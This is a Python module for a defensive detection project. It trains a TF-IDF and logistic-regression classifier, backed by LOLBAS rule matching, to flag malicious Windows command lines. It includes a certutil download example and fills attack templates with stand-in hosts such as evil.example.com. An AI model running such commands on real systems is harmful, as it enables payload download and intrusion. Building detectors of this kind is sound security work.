"""Is this command malicious? Public attack data, a rule check and a trained classifier.

The behaviour model (model.py) says a program is new or odd for this computer; it cannot
tell `certutil -hashfile` (harmless) from `certutil -urlcache -f http://... a.exe`
(a download). This file answers that, from public attack data instead of a list written by hand:

  dataset   malicious commands come from two public projects, benign ones from our own
            endpoint and a list of everyday administration commands
              LOLBAS            https://github.com/LOLBAS-Project/LOLBAS            (GPL-3.0)
              Atomic Red Team   https://github.com/redcanaryco/atomic-red-team      (MIT)
  rules     a command that contains the program and the switches of a LOLBAS entry is that
            entry: a known technique, no guessing (match)
  model     a classifier (TF-IDF of the command text + logistic regression) for the commands
            no rule knows, which gives the chance that a command is malicious (probability)

Run it from company/backend (or press Run in VS Code):

    python -m app.services.ml.commands                 # build the dataset if needed, then train and test
    python -m app.services.ml.commands --rebuild       # build the dataset again
    python -m app.services.ml.commands --charts        # also draw charts into ml_reports/commands/
    python -m app.services.ml.commands --classify "certutil -urlcache -f http://x/a.exe a.exe"

The public projects are cloned into Final Year Project/datasets/public/ (see that folder's
README); the dataset and the model are written outside the repository.

What the test does and does not show (also printed with the results):
  - The malicious commands are demonstrations of attack techniques, the benign ones are partly
    written by us. A classifier can learn "which source wrote it" instead of "is it malicious", so
    the random 80/20 test is the easy case. The second test trains on LOLBAS and tests on Atomic
    Red Team, which the model has never seen: that is the honest one.
  - Neither is a measurement of detection on real attackers.
"""

from __future__ import annotations

import argparse
import csv
import os
import random
import re
import sys
import warnings
from collections import Counter
from pathlib import Path

warnings.filterwarnings("ignore", message="Unknown solver options")  # scipy/scikit-learn version noise

if __name__ == "__main__":  # run as a plain file (VS Code Run): make `app` importable and find .env
    _backend = Path(__file__).resolve().parents[3]
    sys.path.insert(0, str(_backend))
    os.chdir(_backend)

import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix, roc_auc_score, roc_curve
from sklearn.model_selection import GroupShuffleSplit
from sklearn.pipeline import FeatureUnion, Pipeline

_BACKEND = Path(__file__).resolve().parents[3]
DATASETS = Path(__file__).resolve().parents[7] / "datasets"
LOLBAS_DIR = DATASETS / "public" / "lolbas" / "yml"
ATOMIC_DIR = DATASETS / "public" / "atomic-red-team" / "atomics"
ENDPOINT_CSV = DATASETS / "endpoint-8.csv.gz"
COMMANDS_CSV = DATASETS / "commands.csv"
MODEL_PATH = _BACKEND / "ml_models" / "command_model.joblib"
REPORTS = _BACKEND / "ml_reports" / "commands"

THRESHOLD = 0.5  # a command with at least this chance of being malicious is flagged
SEED = 42


def bar(iterable, desc: str, total: int | None = None):
    """A progress bar (tqdm) when it is installed, the plain iterable otherwise."""
    try:
        from tqdm import tqdm
    except ImportError:
        return iterable
    return tqdm(iterable, desc=desc, total=total, ncols=88)

# ============================================================================
# normalising a command: the same text for the same command, whatever its paths and hosts
# ============================================================================

_BLOB = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
_URL = re.compile(r"(?:https?|ftp)://[^\s'\"]+|\\\\[\w.\-]+\\[^\s'\"]+", re.I)
_PATH = re.compile(r"[a-z]:\\[^\s'\"<>|]*", re.I)
_IP = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")


def program_of(command: str) -> str:
    """The program a command runs: 'C:\\Windows\\System32\\certutil.exe -x' -> 'certutil'."""
    text = command.strip()
    if text.startswith('"'):
        first = text[1:].split('"', 1)[0]
    else:
        first = text.split(None, 1)[0] if text else ""
    name = first.replace("/", "\\").rsplit("\\", 1)[-1].lower()
    return name[:-4] if name.endswith(".exe") else name


def normalize(command: str) -> str:
    text = " ".join(command.split())
    if not text:
        return ""
    program = program_of(text)
    rest = text[len(text.split(None, 1)[0]):] if not text.startswith('"') else text[text.find('"', 1) + 1:]
    text = f"{program} {rest}".strip()
    text = _BLOB.sub("<blob>", text)
    text = _URL.sub("<url>", text)
    text = _PATH.sub(lambda m: "<path>" + os.path.splitext(m.group(0))[1].lower(), text)
    text = _IP.sub("<ip>", text)
    return text.lower()


# ============================================================================
# dataset: where the labelled commands come from
# ============================================================================

_PLACEHOLDER = re.compile(r"\{([A-Za-z_]+)(?::([^}]*))?\}")
_HOSTS = ["evil.example.com", "198.51.100.7", "files.example.net", "cdn.example.org", "203.0.113.20"]
_NAMES = ["payload", "update", "setup", "svc", "report", "data", "tool", "run"]
_CMDS = ["cmd.exe /c whoami", "calc.exe", "powershell -nop -w hidden -c whoami", "notepad.exe", "net user"]


def _fill_lolbas(text: str, rng: random.Random) -> str:
    """LOLBAS writes {REMOTEURL:.exe}, {PATH:.dll}...: put a plausible value in each."""

    def value(m: re.Match) -> str:
        kind, ext = m.group(1).upper(), m.group(2) or ""
        name = rng.choice(_NAMES)
        if kind == "REMOTEURL":
            return f"http://{rng.choice(_HOSTS)}/{name}{ext}"
        if kind == "PATH_SMB":
            return f"\\\\{rng.choice(_HOSTS)}\\share\\{name}{ext}"
        if kind == "CMD":
            return rng.choice(_CMDS)
        if kind.startswith("PATH"):
            return f"C:\\Users\\Public\\{name}{ext}"
        return f"{name}{ext}"

    return _PLACEHOLDER.sub(value, text)


def _yaml():
    import yaml  # only needed to build the dataset, so it is imported here

    return yaml


def read_lolbas(folder: Path = LOLBAS_DIR, variants: int = 3) -> list[dict]:
    """Every example command of every LOLBAS entry, `variants` times with different values."""
    yaml, rng, rows = _yaml(), random.Random(SEED), []
    for path in bar(sorted(folder.rglob("*.yml")), "Reading LOLBAS"):
        try:
            doc = yaml.safe_load(path.read_text(encoding="utf-8", errors="replace")) or {}
        except Exception:
            continue
        for item in doc.get("Commands") or []:
            template = (item or {}).get("Command")
            if not template:
                continue
            for _ in range(variants):
                rows.append({
                    "command": " ".join(_fill_lolbas(str(template), rng).split()),
                    "label": 1, "source": "lolbas", "technique": item.get("MitreID") or "",
                    "category": item.get("Category") or "", "template": str(template),
                })
    return rows


# MITRE ATT&CK "Discovery" techniques (whoami, sc query, net share...). Atomic Red Team has tests
# for them, but the commands are the same ones an administrator types every day: calling them
# malicious would only teach the model that everyday commands are attacks, so they are left out.
DISCOVERY = {
    "T1007", "T1010", "T1012", "T1016", "T1018", "T1033", "T1040", "T1046", "T1049", "T1057", "T1069", "T1082",
    "T1083", "T1087", "T1120", "T1124", "T1135", "T1201", "T1217", "T1482", "T1518", "T1526", "T1538", "T1580",
}  # fmt: skip


def read_atomic(folder: Path = ATOMIC_DIR, max_lines: int = 1000) -> list[dict]:
    """The Windows commands of Atomic Red Team's tests, one line each, with the test's
    own default values filled in (Discovery techniques left out, see DISCOVERY)."""
    yaml, rows = _yaml(), []
    for path in bar(sorted(folder.rglob("T*.y*ml")), "Reading Atomic Red Team"):
        try:
            doc = yaml.safe_load(path.read_text(encoding="utf-8", errors="replace")) or {}
        except Exception:
            continue
        technique = str(doc.get("attack_technique") or path.stem)
        if technique.split(".")[0] in DISCOVERY:
            continue
        for test in doc.get("atomic_tests") or []:
            if "windows" not in (test.get("supported_platforms") or []):
                continue
            executor = test.get("executor") or {}
            if executor.get("name") not in ("command_prompt", "powershell") or not executor.get("command"):
                continue
            text = str(executor["command"])
            for key, spec in (test.get("input_arguments") or {}).items():
                text = text.replace("#{" + key + "}", str((spec or {}).get("default", "")))
            text = text.replace("$PathToAtomicsFolder", "C:\\AtomicRedTeam\\atomics").replace("PathToAtomicsFolder", "C:\\AtomicRedTeam\\atomics")
            if "#{" in text:  # a value we cannot know
                continue
            lines = [ln.strip() for ln in text.splitlines()]
            lines = [ln for ln in lines if len(ln) >= 10 and not ln.startswith(("#", "REM ", "::", "echo off"))]
            for line in lines[:max_lines]:
                rows.append({"command": line[:1000], "label": 1, "source": "atomic", "technique": technique,
                             "category": executor["name"], "template": ""})
    return rows


# Everyday administration commands, including the harmless uses of the very programs LOLBAS lists
# (certutil -hashfile, bitsadmin /list...): without them the model would only learn program names.
# Written by us, so the dataset says so (source "synthetic-benign").
_BENIGN = """
certutil -hashfile {f} SHA256|certutil -hashfile {f} MD5|certutil -store my|certutil -viewstore my|certutil -dump {f}
bitsadmin /list|bitsadmin /list /allusers|bitsadmin /getstate job1
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall|reg query HKCU\\Software\\Microsoft\\Office|reg export HKCU\\Software\\MyApp {f}
vssadmin list shadows|vssadmin list volumes|bcdedit /enum|bcdedit
wscript //?|cscript //nologo {f}|cscript //?|runas /?|mshta /?
ipconfig|ipconfig /all|ipconfig /flushdns|ping 8.8.8.8|ping -n 4 {h}|nslookup {h}|tracert {h}|netstat -ano|netstat -an|hostname|getmac
whoami|whoami /all|whoami /groups|systeminfo|net user|net localgroup administrators|net share|net use Z: \\\\{h}\\share|net time
tasklist|tasklist /fi "imagename eq chrome.exe"|taskkill /im notepad.exe /f|taskkill /pid 4120 /f
sc query|sc query wuauserv|sc query spooler|sc qc spooler|schtasks /query|schtasks /query /fo LIST /v
wevtutil qe System /c:5 /f:text|wevtutil el|gpresult /r|gpupdate /force|driverquery|wmic os get caption|wmic cpu get name|wmic bios get serialnumber
powershell -NoProfile -Command Get-Process|powershell -Command "Get-Process | Select-Object -First 5"|powershell -Command Get-Date|powershell Get-ChildItem C:\\Users|powershell -Command "Get-Service | Where-Object Status -eq Running"|powershell Get-EventLog -LogName System -Newest 10
cmd /c dir|cmd /c echo hello|cmd /c ver|cmd /c copy {f} D:\\backup\\|xcopy {f} D:\\backup /E|robocopy C:\\src D:\\bak /E|attrib +r {f}|icacls {f}|icacls {f} /grant users:R|cipher /?
findstr /s "invoice" *.txt|find /c "error" {f}|curl https://api.github.com|curl -I https://{h}
msiexec /i C:\\Installers\\setup.msi /qn|msiexec /x {{GUID}} /qn
git status|git pull|git commit -m "update"|python script.py|python -m pip install requests|node app.js|npm install|code .|dotnet build|java -jar app.jar
"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --profile-directory=Default|"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /e|notepad.exe C:\\Users\\Public\\notes.txt|explorer.exe C:\\Users|"C:\\Program Files\\7-Zip\\7z.exe" x archive.zip|mspaint.exe|calc.exe
""".strip().splitlines()


# More everyday commands, by the kind of work (the pool names in {braces} are filled in at random).
# Every group also contains the harmless uses of programs that LOLBAS lists, since those are the
# commands a classifier that only knows program names gets wrong. Nothing here downloads, runs
# something from the network, decodes, hides or impersonates: that is what the malicious side is.
_POOLS = {
    "h": ["example.com", "intranet.local", "10.0.0.5", "fileserver", "dc01", "mail.example.com", "192.168.1.1", "printer01", "8.8.8.8", "wiki.example.org"],
    "f": ["C:\\Users\\alice\\Documents\\report.docx", "C:\\Users\\bob\\Desktop\\notes.txt", "D:\\data\\export.csv", "C:\\Temp\\log.txt", "C:\\Users\\Public\\readme.md", "E:\\backup\\archive.zip", "C:\\Windows\\notepad.exe", "C:\\Windows\\System32\\drivers\\etc\\hosts"],
    "d": ["C:\\Users\\alice", "D:\\projects", "C:\\Program Files", "C:\\Windows\\Temp", "D:\\backup", "C:\\Users\\bob\\Downloads", "E:\\share"],
    "n": ["2", "4", "10", "20"],
    "svc": ["wuauserv", "spooler", "bits", "Dnscache", "W32Time", "WinDefend", "Themes", "Audiosrv", "LanmanServer", "EventLog"],
    "u": ["alice", "bob", "john.smith", "m.lee", "helpdesk"],
    "app": ["chrome.exe", "msedge.exe", "notepad.exe", "excel.exe", "winword.exe", "outlook.exe", "teams.exe", "code.exe", "slack.exe", "zoom.exe"],
    "url": ["https://www.microsoft.com", "https://github.com/octocat/hello-world", "https://intranet.local/portal", "https://mail.example.com/inbox", "https://docs.python.org", "https://stackoverflow.com/questions"],
    "alg": ["SHA256", "SHA1", "MD5", "SHA512"],
    "cmdlet": ["Get-Process", "Get-Service", "Get-ChildItem", "Get-Date", "Get-Location", "Get-Content {f}", "Get-NetIPAddress", "Get-Disk", "Get-HotFix", "Get-ComputerInfo", "Get-LocalUser", "Get-EventLog -LogName System -Newest 20", "Get-Volume", "Get-Help Get-Process", "Test-Connection {h}", "Select-String -Path {f} -Pattern error"],
    "pipe": ["", " | Select-Object -First 10", " | Sort-Object Name", " | Format-Table -AutoSize", " | Where-Object {$_.Status -eq 'Running'}", " | Measure-Object"],
    "pkg": ["requests", "numpy", "pandas", "flask", "pytest", "black"],
    "branch": ["main", "develop", "feature/login", "fix/typo"],
}  # fmt: skip

# Bigger pools, so that the same template gives many different commands (host names, users, services...).
_POOLS["h"] += [f"srv{i:02d}.corp.local" for i in range(1, 31)] + [f"pc-{d}-{i:02d}" for d in ("hr", "fin", "it", "ops", "sales") for i in range(1, 9)]
_POOLS["u"] += [f"{a}.{b}" for a in ("anna", "li", "omar", "sara", "tom", "wei", "yuki", "zoe") for b in ("lee", "tan", "khan", "wong", "ng")]
_POOLS["svc"] += ["Winmgmt", "Schedule", "Netlogon", "Dhcp", "Browser", "CryptSvc", "PlugPlay", "RpcSs", "SENS", "ShellHWDetection", "Spooler", "TermService", "UserManager", "WSearch", "wscsvc"]
_POOLS["app"] += ["firefox.exe", "acrord32.exe", "powerpnt.exe", "onenote.exe", "vlc.exe", "winrar.exe", "mspaint.exe", "calc.exe", "devenv.exe", "putty.exe", "filezilla.exe", "notepad++.exe"]
_POOLS["pkg"] += ["scipy", "matplotlib", "django", "sqlalchemy", "pydantic", "httpx", "pillow", "openpyxl", "beautifulsoup4", "scikit-learn", "tqdm", "pyyaml"]
_POOLS["branch"] += ["release/1.2", "hotfix/db", "feature/reports", "feature/export", "chore/deps", "docs/readme"]
_USERS = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi", "ivan", "judy"]
_FOLDERS = ["Documents", "Desktop", "Downloads", "Pictures", "Projects", "Reports", "Invoices", "Backup"]
_STEMS = ["report", "notes", "budget", "invoice", "summary", "export", "meeting", "draft", "readme", "log", "data", "plan"]
_POOLS["f"] += [f"C:\\Users\\{u}\\{d}\\{s}.{e}" for u in _USERS for d in _FOLDERS[:4] for s in _STEMS[:6] for e in ("txt", "docx", "xlsx")][:240]
_POOLS["d"] += [f"C:\\Users\\{u}\\{d}" for u in _USERS for d in _FOLDERS] + [f"D:\\{x}" for x in ("data", "projects", "backup", "share", "archive", "tools", "logs")]
_POOLS["url"] += [f"https://{h}/{p}" for h in ("intranet.local", "wiki.example.org", "portal.example.com", "docs.example.net") for p in ("home", "reports", "inbox", "calendar", "tickets", "wiki/start")]
_POOLS["cmdlet"] += ["Get-NetAdapter", "Get-Printer", "Get-Item {f}", "Get-ItemProperty HKCU:\\Software\\Microsoft", "Get-Module -ListAvailable", "Get-Command", "Get-History", "Get-PSDrive", "Get-TimeZone", "Get-Culture", "Get-WmiObject Win32_OperatingSystem", "Get-CimInstance Win32_LogicalDisk", "Measure-Command { Start-Sleep 1 }", "Resolve-DnsName {h}", "Test-NetConnection {h} -Port 443", "Get-ScheduledTask", "Get-SmbShare", "Get-LocalGroup"]

_TEMPLATES = """
ping {h}|ping -n {n} {h}|ping -t {h}|tracert {h}|tracert -d {h}|nslookup {h}|nslookup -type=mx {h}|pathping {h}
ipconfig|ipconfig /all|ipconfig /release|ipconfig /renew|ipconfig /flushdns|ipconfig /displaydns|netstat -ano|netstat -an|netstat -r|arp -a|route print|getmac|hostname|ver|nbtstat -n
systeminfo|systeminfo /fo csv|whoami|whoami /all|whoami /groups|whoami /priv|set|echo %USERNAME%|echo %PATH%|date /t|time /t|cls|tree {d}|vol
net user|net user {u}|net localgroup|net localgroup administrators|net share|net view \\\\{h}|net use|net use Z: \\\\{h}\\share|net time \\\\{h}|net statistics workstation|net start|net config workstation
net1 user|net1 user {u}|net1 session|net1 localgroup|net1 localgroup administrators|net1 share|net1 use|net1 view \\\\{h}|net1 start {svc}|net1 stop {svc}|net session
net stop WazuhSvc|net start WazuhSvc|sc query WazuhSvc|sc query Wazuh|sc qc WazuhSvc|net stop wazuh|net start wazuh
auditpol /get /category:*|auditpol /get /subcategory:"Logon"|auditpol /list /subcategory:*|auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable|auditpol /set /subcategory:"Logon" /success:enable /failure:enable|auditpol /set /subcategory:{0CCE922B-69AE-11D9-BED3-505054503030} /success:enable /failure:enable|auditpol /set /subcategory:{0CCE9215-69AE-11D9-BED3-505054503030} /success:enable /failure:enable|auditpol /set /subcategory:{0CCE9248-69AE-11D9-BED3-505054503030} /success:enable
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f|cmd /c "C:\\Users\\{u}\\Desktop\\AegisGuard-Installer-{u}.cmd"|cmd /c "C:\\Users\\{u}\\Downloads\\AegisGuard-Installer-{u}.cmd"
net start {svc}|net stop {svc}|sc query|sc query {svc}|sc qc {svc}|sc start {svc}|sc stop {svc}|sc queryex type= service state= all
tasklist|tasklist /v|tasklist /svc|tasklist /fi "imagename eq {app}"|taskkill /im {app}|taskkill /im {app} /f|taskkill /pid 4120 /f
schtasks /query|schtasks /query /fo LIST /v|schtasks /query /tn "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag"
wmic os get caption,version|wmic cpu get name|wmic bios get serialnumber|wmic logicaldisk get size,freespace,caption|wmic memorychip get capacity|wmic product get name,version|wmic qfe list brief|wmic computersystem get model,name,manufacturer
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall|reg query HKCU\\Software\\Microsoft\\Office|reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName|reg export HKCU\\Software\\MyApp {f}|reg query "HKCU\\Control Panel\\Desktop" /v Wallpaper
certutil -hashfile {f} {alg}|certutil -store my|certutil -store root|certutil -viewstore my|certutil -verify {f}|certutil -dump {f}|certutil -ping|certutil -?
bitsadmin /list|bitsadmin /list /allusers|bitsadmin /list /verbose|bitsadmin /getstate job1|bitsadmin /?|bitsadmin /monitor
vssadmin list shadows|vssadmin list volumes|vssadmin list writers|vssadmin list providers|bcdedit|bcdedit /enum|bcdedit /enum all|bcdedit /v
wscript //?|wscript //h:cscript|cscript //nologo {f}|cscript //?|runas /?|mshta /?|msiexec /?|msiexec /i C:\\Installers\\setup.msi /qn|msiexec /i C:\\Installers\\tool.msi /passive|msiexec /x {{GUID}} /qn
wevtutil qe System /c:5 /f:text|wevtutil qe Application /c:10 /rd:true /f:text|wevtutil el|wevtutil gl System|gpresult /r|gpresult /h report.html|gpupdate /force|driverquery|driverquery /v|systeminfo | findstr /B /C:"OS"
cmd /c dir|cmd /c dir {d}|cmd /c echo hello|cmd /c ver|cmd /c cd|cmd /k|cmd /c type {f}|cmd /c copy {f} {d}|cmd /c mkdir {d}\\new|cmd /c rmdir /s /q {d}\\old|cmd /c ren {f} {f}.bak
dir|dir {d}|dir /s /b {d}|dir /a|dir *.txt|cd {d}|mkdir {d}\\new|rmdir {d}\\old|copy {f} {d}|move {f} {d}|del {f}|ren {f} copy.txt|type {f}|more {f}|xcopy {f} {d} /E /I|robocopy {d} D:\\backup /E|robocopy {d} D:\\backup /MIR /R:2
attrib {f}|attrib +r {f}|attrib -h {f}|icacls {f}|icacls {d}|icacls {f} /grant {u}:R|cipher /?|compact /?|fsutil volume diskfree C:|chkdsk C:|sfc /scannow|dism /online /get-features|defrag C: /A
findstr /s "invoice" *.txt|findstr /i error {f}|find /c "error" {f}|find "TODO" {f}|sort {f}|fc {f} {f}.bak|comp {f} {f}.bak
powershell -NoProfile -Command {cmdlet}|powershell -Command "{cmdlet}{pipe}"|powershell {cmdlet}{pipe}|powershell -NoLogo -NoProfile -Command "{cmdlet}{pipe}"|pwsh -Command "{cmdlet}{pipe}"|powershell -Command "Get-ChildItem {d}{pipe}"
curl https://api.github.com|curl -I https://{h}|curl --version|curl -s https://{h}/health|curl -X GET https://{h}/api/status
git status|git pull|git push|git log --oneline -5|git diff|git checkout {branch}|git commit -m "update docs"|git clone https://github.com/octocat/hello-world.git|git branch -a|git stash
python script.py|python -m pip install {pkg}|python -m pip list|python -m venv .venv|python -m pytest|python -V|pip install -r requirements.txt|node app.js|node -v|npm install|npm run build|npm test|dotnet build|dotnet run|java -jar app.jar|docker ps|docker images|code .|code {f}|winget list|winget upgrade --all|choco list
"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" {url}|"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --profile-directory=Default|"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" {url}|"C:\\Program Files\\Mozilla Firefox\\firefox.exe" {url}|"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" "{f}"|"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "{f}"|"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"|"C:\\Program Files\\7-Zip\\7z.exe" x "{f}"|"C:\\Program Files\\7-Zip\\7z.exe" a archive.7z {d}|notepad.exe {f}|explorer.exe {d}|explorer.exe /select,"{f}"|mspaint.exe {f}|calc.exe|snippingtool.exe|mstsc /v:{h}|control.exe|control.exe printers|msinfo32.exe|taskmgr.exe|perfmon.exe|eventvwr.msc|services.msc|compmgmt.msc|devmgmt.msc|diskmgmt.msc|appwiz.cpl|ncpa.cpl|regedit.exe
""".strip().splitlines()


def synthetic_benign(rng: random.Random, target: int = 7000) -> list[dict]:
    """About `target` different everyday commands made from the templates above."""
    templates = [t for line in _TEMPLATES for t in line.split("|")]
    seen, rows, tries = set(), [], 0
    progress = bar(range(target), "Making benign commands")
    done = iter(progress)
    while len(rows) < target and tries < target * 40:
        tries += 1
        command = rng.choice(templates)
        for _ in range(3):  # a value can itself hold a {pool} (the cmdlets)
            command = re.sub(r"\{([a-z]+)\}", lambda m: rng.choice(_POOLS[m.group(1)]) if m.group(1) in _POOLS else m.group(0), command)
        command = command.replace("{{GUID}}", "{GUID}")
        if command not in seen:
            seen.add(command)
            rows.append({"command": command, "label": 0, "source": "synthetic-benign", "technique": "", "category": "", "template": ""})
            next(done, None)
    if hasattr(progress, "close"):
        progress.close()
    return rows


def read_benign(endpoint_csv: Path = ENDPOINT_CSV, rng: random.Random | None = None) -> list[dict]:
    """Benign commands: the real command lines of our test endpoint, and made-up everyday ones."""
    rng = rng or random.Random(SEED)
    rows, seen = [], set()
    if endpoint_csv.exists():
        from app.services.ml.data import load_csv
        from app.services.ml.model import is_user_action

        for r in load_csv(str(endpoint_csv), endpoint_id=8, user_actions_only=True):
            command = (r.get("command_line") or "").strip()
            # only what a person ran: not Windows services, updates or our own installer
            if r["windows_event_id"] == "4688" and is_user_action(r) and len(command) >= 6 and command not in seen:
                seen.add(command)
                rows.append({"command": command[:1000], "label": 0, "source": "endpoint", "technique": "", "category": "", "template": ""})
    files = ["C:\\Users\\Public\\report.pdf", "C:\\Users\\alice\\Documents\\notes.txt", "D:\\data\\file.bin", "C:\\Temp\\x.dll"]
    hosts = ["example.com", "intranet.local", "10.0.0.5", "fileserver"]
    for line in _BENIGN:
        for template in line.split("|"):
            for _ in range(3):
                command = template.replace("{f}", rng.choice(files)).replace("{h}", rng.choice(hosts)).replace("{{GUID}}", "{GUID}")
                rows.append({"command": command, "label": 0, "source": "synthetic-benign", "technique": "", "category": "", "template": ""})
    return rows + synthetic_benign(rng)


def build_dataset(path: Path = COMMANDS_CSV) -> list[dict]:
    rows = read_lolbas() + read_atomic() + read_benign()
    seen, unique = set(), []
    for r in rows:  # the same command text with the same label counts once
        key = (r["command"], r["label"])
        if key not in seen:
            seen.add(key)
            unique.append(r)
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=["command", "label", "source", "technique", "category", "template"])
        writer.writeheader()
        writer.writerows(unique)
    return unique


def load_dataset(path: Path = COMMANDS_CSV) -> list[dict]:
    with open(path, newline="", encoding="utf-8") as handle:
        rows = list(csv.DictReader(handle))
    for r in rows:
        r["label"] = int(r["label"])
    return rows


# ============================================================================
# rules: a LOLBAS entry is recognised by its program and its switches
# ============================================================================


class Rules:
    """Matches a command to a LOLBAS entry: same program, and every switch of the entry present.
    `certutil -urlcache -f <url> <file>` matches the download entry; `certutil -hashfile` matches nothing."""

    def __init__(self, rows: list[dict]):
        self._by_program: dict[str, list[tuple[tuple[str, ...], dict]]] = {}
        for r in rows:
            if r["source"] != "lolbas" or not r["template"]:
                continue
            tokens = r["template"].replace("\\", "/").split()
            program = program_of(r["template"])
            # What identifies the entry: its literal words and switches ('-urlcache', '/i:', 'scrobj.dll');
            # a value such as {REMOTEURL} says nothing, only what comes before it ('/i:{REMOTEURL}' -> '/i:').
            heads = (token.split("{")[0].strip("\"'").lower() for token in tokens[1:])
            switches = [head for head in heads if len(head) >= 2]
            if switches:  # an entry with nothing to tell it apart would match every use of the program
                self._by_program.setdefault(program, []).append((tuple(switches), r))
        self.entries = sum(len(v) for v in self._by_program.values())

    def match(self, command: str) -> dict | None:
        program = program_of(command)
        words = command.replace("\\", "/").lower().split()[1:]
        best = None
        for switches, row in self._by_program.get(program, []):
            if all(any(w == s or (s.endswith(":") and w.startswith(s)) or (len(s) > 3 and s in w) for w in words) for s in switches):
                if best is None or len(switches) > best[0]:  # the most specific entry wins
                    best = (len(switches), row)
        return None if best is None else {"technique": best[1]["technique"], "category": best[1]["category"], "entry": best[1]["template"]}


# ============================================================================
# model: the chance that a command is malicious
# ============================================================================


def make_pipeline() -> Pipeline:
    features = FeatureUnion([
        ("chars", TfidfVectorizer(analyzer="char_wb", ngram_range=(2, 5), min_df=2, sublinear_tf=True)),
        ("words", TfidfVectorizer(token_pattern=r"[^\s]+", ngram_range=(1, 2), min_df=2, sublinear_tf=True)),
    ])
    return Pipeline([("tfidf", features), ("clf", LogisticRegression(C=10, max_iter=3000, class_weight="balanced"))])


def fit_pipeline(commands: list[str], labels, desc: str = "Training") -> Pipeline:
    """make_pipeline().fit(...), one step at a time so that a progress bar can show it."""
    pipeline = make_pipeline()
    texts = [normalize(c) for c in commands]
    steps = bar(["TF-IDF features", "Logistic regression"], desc, total=2)
    for step in steps:
        if hasattr(steps, "set_postfix_str"):
            steps.set_postfix_str(step)
        if step == "TF-IDF features":
            features = pipeline.named_steps["tfidf"].fit_transform(texts)
        else:
            pipeline.named_steps["clf"].fit(features, labels)
    return pipeline


class CommandModel:
    """What the backend uses: model + rules in one object. `check(command)` -> dict."""

    def __init__(self, pipeline: Pipeline, rules: Rules | None):
        self.pipeline, self.rules = pipeline, rules

    def probability(self, commands: list[str], desc: str | None = None, chunk: int = 500) -> np.ndarray:
        """The chance that each command is malicious. With `desc` a progress bar is shown."""
        out = []
        starts = range(0, len(commands), chunk)
        for start in (bar(starts, desc, total=len(starts)) if desc else starts):
            out.append(self.pipeline.predict_proba([normalize(c) for c in commands[start : start + chunk]])[:, 1])
        return np.concatenate(out) if out else np.array([])

    def check_many(self, commands: list[str]) -> list[dict]:
        """One verdict per command: {'malicious': bool, 'probability': 0-1, 'confirmed': bool, 'technique',
        'category'}. A rule match is confirmed (a known technique); otherwise the classifier's chance decides."""
        probs = self.probability(commands) if commands else []
        out = []
        for command, p in zip(commands, probs):
            hit = self.rules.match(command) if self.rules else None
            if hit:
                out.append({"malicious": True, "probability": max(float(p), 0.99), "confirmed": True, **hit})
            else:
                out.append({"malicious": bool(p >= THRESHOLD), "probability": float(p), "confirmed": False, "technique": "", "category": ""})
        return out

    def check(self, command: str) -> dict:
        return self.check_many([command])[0]


def save(model: CommandModel, path: Path = MODEL_PATH) -> None:
    import joblib

    path.parent.mkdir(parents=True, exist_ok=True)
    joblib.dump(model, path)


def load(path: Path = MODEL_PATH) -> CommandModel:
    import joblib

    return joblib.load(path)


# ============================================================================
# test: train on one part, test on the other, and print what the teacher asks for
# ============================================================================


def show(title: str, y: np.ndarray, flagged: np.ndarray, prob: np.ndarray | None = None) -> None:
    """The report every scikit-learn tutorial prints: accuracy, the per-class table of
    precision / recall / f1-score / support, the confusion matrix and the ROC AUC."""
    flagged = np.asarray(flagged).astype(int)
    tn, fp, fn, tp = confusion_matrix(y, flagged, labels=[0, 1]).ravel()
    print(f"\n{title}")
    print(f"Accuracy: {accuracy_score(y, flagged):.4f}")
    print()
    print(classification_report(y, flagged, labels=[0, 1], target_names=["benign", "malicious"], digits=4, zero_division=0))
    print("Confusion matrix:  (rows = actual benign, malicious; columns = predicted benign, malicious)")
    print(confusion_matrix(y, flagged, labels=[0, 1]))
    print(f"False-positive rate: {fp / max(fp + tn, 1):.4f}")
    if prob is not None and len(set(y)) == 2:
        print(f"ROC AUC: {roc_auc_score(y, prob):.4f}")


def group_split(items: list[dict], test_size: float) -> tuple[np.ndarray, np.ndarray]:
    """Random split into learn / test, but commands that are the same once their paths, hosts and
    addresses are removed always go to the same side: a test command is never a near-copy of one
    the model learned from."""
    groups = [normalize(r["command"]) for r in items]
    splitter = GroupShuffleSplit(n_splits=1, test_size=test_size, random_state=SEED)
    return next(splitter.split(np.arange(len(items)), groups=groups))


def run_tests(rows: list[dict], charts: bool = True, show_windows: bool = False) -> CommandModel:
    y = np.array([r["label"] for r in rows])
    patterns = len({normalize(r["command"]) for r in rows})
    print("=" * 70)
    print("Malicious command detection: LOLBAS + Atomic Red Team + benign commands")
    print("=" * 70)
    print(f"Dataset shape: ({len(rows)}, 2)   columns: command, label")
    print(f"Different commands once paths and hosts are removed: {patterns}")
    print("Label distribution:")
    print(f"  0 (benign)    {int((y == 0).sum()):>6}")
    print(f"  1 (malicious) {int(y.sum()):>6}")
    print("By source:")
    for source, n in sorted(Counter(r["source"] for r in rows).items()):
        print(f"  {source:18} {n:>6}")

    # --- 1. the standard test: 80% learn, 20% test (split by group, see group_split)
